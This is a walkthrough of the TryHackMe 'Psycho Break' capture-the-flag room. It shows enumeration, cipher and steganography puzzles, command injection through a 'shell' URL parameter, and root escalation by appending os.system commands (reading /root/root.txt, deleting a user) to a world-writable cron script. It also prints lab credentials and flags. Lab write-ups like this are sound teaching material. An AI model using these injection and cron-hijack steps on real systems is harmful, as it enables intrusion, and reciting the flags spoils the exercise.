# TryHackMe — Psycho Break
**Difficulty:** Easy  
**Category:** Web, Steganography, Cryptography, Privilege Escalation  
**Theme:** Based on the video game *The Evil Within*

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Task 2 — Web Enumeration & Key Hunting](#task-2--web-enumeration--key-hunting)
3. [Task 3 — Escaping Laura & FTP Access](#task-3--escaping-laura--ftp-access)
4. [Task 4 — Brute Force & Cipher Decoding](#task-4--brute-force--cipher-decoding)
5. [Task 5 — User & Root Flags](#task-5--user--root-flags)
6. [Bonus — Deleting User Ruvik](#bonus--deleting-user-ruvik)

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC 10.65.145.171
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

> **Answers:**
> - Open ports: **3**
> - Operating System: **Ubuntu**

Anonymous FTP login is **disabled** — nothing to do here yet. Moving on to HTTP.

---

## Task 2 — Web Enumeration & Key Hunting

### Homepage Recon

Visiting `http://10.65.145.171/` and checking the page source reveals a hidden comment:

```html
<!-- Sebastian sees a path through the darkness which leads to a room => /sadistRoom -->
```

Also note the link `map.html` in the HTML — this will be important later.

### Gobuster

```bash
gobuster dir -u http://10.65.145.171 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,zip -t 50 -o gobuster_results.txt
```

Notable results:
- `/map.php` — key-protected map page
- `/index.php` — main page

---

### Sadist Room — Key #1 (Locker Room Key)

Navigate to `/sadistRoom`. Clicking the key link triggers a JavaScript alert:

```
Key to locker Room => 532219a04ab7a02b56faafbec1a4c1ea
```

Inspecting `scripts.js` confirms the flow:

```javascript
$(".btn-danger").click(function(e) {
    const key = prompt("Enter Key To The Locker Room");
    if (key == "532219a04ab7a02b56faafbec1a4c1ea"){
        window.open("../lockerRoom/","_self")
    }
});
```

> **Locker Room Key:** `532219a04ab7a02b56faafbec1a4c1ea`

---

### Locker Room — Key #2 (Map Key)

Enter the key to access `/lockerRoom/`. The page presents an encoded string:

```
Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv
```

This is an **Atbash Cipher** — each letter maps to its mirror in the alphabet (A↔Z, B↔Y, etc.).

Decoding letter by letter:

```
T=G, i=r, z=a, m=n, t=t → Grant
n=m, v=e → me
z=a, x=c, x=c, v=e, h=s, h=s → access
g=t, l=o → to
g=t, s=h, v=e → the
n=m, z=a, k=p → map
k=p, o=l, v=e, z=a, h=s, v=e → please
```

> **Map Key:** `Grant_me_access_to_the_map_please`

Submit this at `/map.php` to reveal the map with 4 locations.

---

### Safe Heaven — Keeper Key #3

Running Gobuster on `/SafeHeaven/` reveals a hidden directory:

```bash
gobuster dir -u http://10.65.145.171/SafeHeaven/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,js -t 50
```

Found: `/SafeHeaven/keeper/`

Inside `keeper/`, clicking **Escape Keeper** leads to a page with a mystery image and a timer. The page source hints:

```html
<!--To Find it Add Reverse To Google-->
```

Download the image:

```bash
wget http://10.65.145.171/SafeHeaven/keeper/img/image.jpg
```

Upload to [Google Reverse Image Search](https://images.google.com). The image is the **spiral staircase** of the **St. Augustine Lighthouse**, Florida.

The placeholder confirms the format: `**. ********* **********` (2 + 9 + 10 chars).

Enter `St. Augustine Lighthouse` to receive:

> **Keeper Key:** `48ee41458eb0b43bf82b986cecf3af01`

---

### Abandoned Room — OS Command Injection

Submit the Keeper Key at `/abandonedRoom/`. Proceed through the story to reach `herecomeslara.php`.

The page source contains the critical hint:

```html
<!-- There is something called "shell" on current page maybe that'll help you to get out of here !!!-->
```

The page is served under a randomised directory path. Use the `shell` GET parameter for **OS Command Injection**:

```
http://10.65.145.171/abandonedRoom/<hash>/herecomeslara.php?shell=ls
```

Navigating the restricted filesystem (direct path traversal is blocked, but absolute paths work):

```
?shell=ls+..
```

Reveals a second hidden directory. Access it directly in the browser:

```
http://10.65.145.171/abandonedRoom/680e89809965ec41e64dc7e447f175ab/
```

> **Text file name (no extension):** `you_made_it`

---

## Task 3 — Escaping Laura & FTP Access

### Extracting FTP Credentials

Download `helpme.zip` from the hidden directory and extract:

```bash
wget http://10.65.145.171/abandonedRoom/680e89809965ec41e64dc7e447f175ab/helpme.zip
unzip helpme.zip
cat helpme.txt
```

```
From Joseph,
Who ever sees this message "HELP Me". Ruvik locked me up in this cell.
Get the key on the table and unlock this cell.
```

> **Who is in the cell:** `Joseph`

`Table.jpg` is actually a ZIP archive in disguise:

```bash
file Table.jpg      # confirms ZIP
unzip Table.jpg
# extracts: Joseph_Oda.jpg, key.wav
```

### Decoding the WAV File (Morse Code)

`key.wav` contains **Morse code**. Upload to an online Morse decoder (e.g. [morsecode.world](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)).

Result: `SHOWME`

> **Note:** `SHOWME` is not the FTP password — it's the steghide passphrase!

### Steganography on Joseph_Oda.jpg

```bash
steghide extract -sf Joseph_Oda.jpg -p "SHOWME"
cat thankyou.txt
```

The extracted file reveals the actual FTP credentials:

```
USER : joseph
PASSWORD : intotheterror445
```

> **FTP Username:** `joseph`  
> **FTP Password:** `intotheterror445`

---

## Task 4 — Brute Force & Cipher Decoding

### FTP Login

```bash
ftp 10.65.145.171
# joseph / intotheterror445
```

Download both files:

```bash
mget *
bye
```

Files retrieved:
- `program` — ELF binary
- `random.dic` — wordlist

### Brute Forcing the Program

The binary accepts a single word argument and checks it against a hardcoded key:

```bash
chmod +x program
./program
# [+] Usage: ./program <word>
```

Automate with Python:

```python
import subprocess

with open('random.dic', 'r') as f:
    words = f.read().splitlines()

for word in words:
    result = subprocess.run(['./program', word], capture_output=True, text=True)
    output = result.stdout.strip()
    if 'Incorrect' not in output and output != '':
        print(f"[+] Found: {word} => {output}")
        break
```

```bash
python3 brute.py
# [+] Found: kidman => Correct
# Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33
```

> **Key used by the program:** `kidman`

### Decoding T9 / Multi-tap Phone Cipher

The encoded string uses the **Multi-tap (T9) cipher** — the old mobile phone input method where each digit is pressed multiple times to select a letter.

**T9 Reference Table:**
```
2=ABC  3=DEF  4=GHI  5=JKL
6=MNO  7=PQRS 8=TUV  9=WXYZ
```

Decoding:
```
55=K  444=I  3=D  6=M  2=A  66=N  7777=S
7=P  2=A  7777=S  7777=S  9=W  666=O  777=R
3=D  444=I  7777=S  7777=S  666=O  7777=S
8=T  777=R  2=A  66=N  4=G  33=E
```

> **Decoded message:** `KIDMANSPASSWORDISSOSTRANGE`  
> **SSH Password for kidman:** `KIDMANSPASSWORDISSOSTRANGE`

---

## Task 5 — User & Root Flags

### User Flag

```bash
ssh kidman@10.65.145.171
# password: KIDMANSPASSWORDISSOSTRANGE

cat user.txt
```

> **User Flag:** `4C72A4EF8E6FED69C72B4D58431C4254`

### Privilege Escalation — Writable Cron Script

Check running cron jobs:

```bash
cat /etc/crontab
```

```
*/2 * * * * root python3 /var/.the_eye_of_ruvik.py
```

A Python script runs as **root every 2 minutes**. Check its permissions:

```bash
ls -la /var/.the_eye_of_ruvik.py
# -rwxr-xrw- 1 root root 300
```

The file is **world-writable** (`rw-` for others). Append a command to read root.txt:

```bash
echo 'import os; os.system("cat /root/root.txt > /tmp/root_flag.txt")' >> /var/.the_eye_of_ruvik.py
```

Wait up to 2 minutes, then:

```bash
cat /tmp/root_flag.txt
```

> **Root Flag:** `BA33BDF5B8A3BFC431322F7D13F3361E`

---

## Bonus — Deleting User Ruvik

Append the delete command via the same writable cron script:

```bash
echo 'import os; os.system("deluser ruvik")' >> /var/.the_eye_of_ruvik.py
```

Verify after 2 minutes:

```bash
grep ruvik /etc/passwd
# (no output = user deleted)
```

---

## Summary

| Task | Finding | Value |
|------|---------|-------|
| Recon | Open ports | 3 |
| Recon | OS | Ubuntu |
| Sadist Room | Locker Room Key | `532219a04ab7a02b56faafbec1a4c1ea` |
| Locker Room | Map Key (Atbash) | `Grant_me_access_to_the_map_please` |
| Safe Heaven | Keeper Key (Reverse Image) | `48ee41458eb0b43bf82b986cecf3af01` |
| Abandoned Room | Text file name | `you_made_it` |
| helpme.zip | Who's in the cell | `Joseph` |
| key.wav | Morse Code | `SHOWME` (steghide pass) |
| Joseph_Oda.jpg | FTP credentials | `joseph / intotheterror445` |
| program | Brute force key | `kidman` |
| T9 Cipher | SSH password | `KIDMANSPASSWORDISSOSTRANGE` |
| SSH | User flag | `4C72A4EF8E6FED69C72B4D58431C4254` |
| Cron PrivEsc | Root flag | `BA33BDF5B8A3BFC431322F7D13F3361E` |

---

## Key Takeaways

- **Always read HTML comments** — this room hid nearly every clue in them
- **Atbash cipher** is trivial to spot: only letters, mirror substitution
- **Reverse image search** is a legitimate recon technique for CTFs
- **OS Command Injection** output may appear in page source, not rendered HTML
- **Steghide** needs a passphrase — always try strings found nearby
- **Multi-tap/T9** is identifiable by repeated single digits (2-9 range only)
- **World-writable cron scripts** running as root = instant privilege escalation
